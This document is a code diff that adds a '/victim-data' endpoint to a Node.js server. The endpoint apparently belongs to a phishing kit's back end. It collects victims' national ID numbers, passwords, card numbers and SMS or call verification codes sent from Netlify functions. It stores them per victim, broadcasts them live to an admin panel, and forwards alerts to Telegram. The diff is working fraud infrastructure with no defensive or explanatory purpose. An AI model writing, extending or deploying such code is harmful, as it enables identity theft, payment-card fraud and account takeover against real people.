@@ -90,6 +90,54 @@ const server = http.createServer((req, res) => {
     return;
   }
 
+  // POST /victim-data - receive captured data from Netlify functions
+  if (parsedUrl.pathname === '/victim-data' && req.method === 'POST') {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', async () => {
+      try {
+        const { victimId, type, data, ip, page, telegramMsg } = JSON.parse(body);
+        const vId = victimId || 'unknown';
+
+        // Create victim entry if not exists
+        if (!victims[vId]) {
+          victims[vId] = {
+            id: vId,
+            ip: ip || '?',
+            data: { niks: [], passwords: [], cards: [], sms_codes: [], call_codes: [] },
+            lastSeen: new Date(),
+            status: 'online'
+          };
+        }
+
+        // Update data based on type
+        victims[vId].lastSeen = new Date();
+        if (page) victims[vId].lastPage = page;
+
+        if (type === 'nik'      && data) victims[vId].data.niks.push(data);
+        if (type === 'password' && data) victims[vId].data.passwords.push(data);
+        if (type === 'card'     && data) victims[vId].data.cards.push(data);
+        if (type === 'sms'      && data) victims[vId].data.sms_codes.push(data);
+        if (type === 'call'     && data) victims[vId].data.call_codes.push(data);
+
+        // Broadcast update to all admins
+        io.to('admins').emit('victims_update', Object.values(victims));
+
+        // Send Telegram if message provided
+        if (telegramMsg) await sendTelegram(telegramMsg);
+
+        console.log(`[DATA] ${type} from ${vId}`);
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true }));
+      } catch (e) {
+        console.error('victim-data error:', e);
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: false, error: e.message }));
+      }
+    });
+    return;
+  }
+
   // Health check
   if (parsedUrl.pathname === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
